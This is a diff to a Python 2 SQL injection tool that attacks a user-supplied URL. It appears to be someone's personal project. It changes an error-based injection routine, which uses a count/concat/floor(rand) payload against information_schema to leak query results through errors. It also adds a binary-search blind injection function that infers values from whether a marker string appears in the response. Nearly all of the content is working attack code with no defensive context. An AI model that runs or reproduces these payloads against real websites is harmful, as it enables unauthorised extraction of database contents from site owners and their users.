@@ -3,8 +3,11 @@ import httplib
 import urllib
 from urlparse import urlparse
 import sys
+import time
 import argparse
 import error_sql as error
+
+
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-u', dest="url", required=True, action="store", help='SQL Injection Targeting URL')
@@ -33,9 +36,10 @@ delims  =   "!~!~!"
 
 
 def httpreq(request_param):
-    params     = tmp_params+"="+request_param
+    params     = plus_white(tmp_params+"="+request_param)
     conn.request("GET",path+"?"+params,None,headers)
     response = conn.getresponse().read()
+    time.sleep(0.1)
 
     return response
 
@@ -60,16 +64,38 @@ def check_dbms():
 
     else:
         print "[Info] Couldn't Assume database"
-        return
+        return -1
 
 
-def vuln_httpreq(vuln_part):
+def error_httpreq(vuln_part):
 
     vuln_param = "=(select a from (select count(*),concat('"+delims+"',"+vuln_part+",'"+delims+"',floor(rand(0)*2))a from information_schema.tables group by a)b)%23"
     params     = tmp_params+plus_white(vuln_param)
     conn.request("GET",path+"?"+params,None,headers)
     response = conn.getresponse().read () #응답 값
     return response.split(delims)[1]
+
+def blind_httpreq(min, max, query):
+
+    mid = (min+max) / 2
+    tmp_cnt = httpreq(query + ">" + str(mid))
+    print query + ">" + str(mid)
+
+    if tmp_cnt.find('Nancy') > 0: #아직 노완벽벽
+       cnt = 1
+    else:
+        cnt = 0
+
+    if (max-min) <= 1:
+        if cnt:
+            return max
+        else:
+            return min
+
+    if cnt:
+        return blind_httpreq(mid,max,query)
+    else:
+        return blind_httpreq(min,mid,query)
 
 def plus_white(query):
     return query.replace(' ','+')
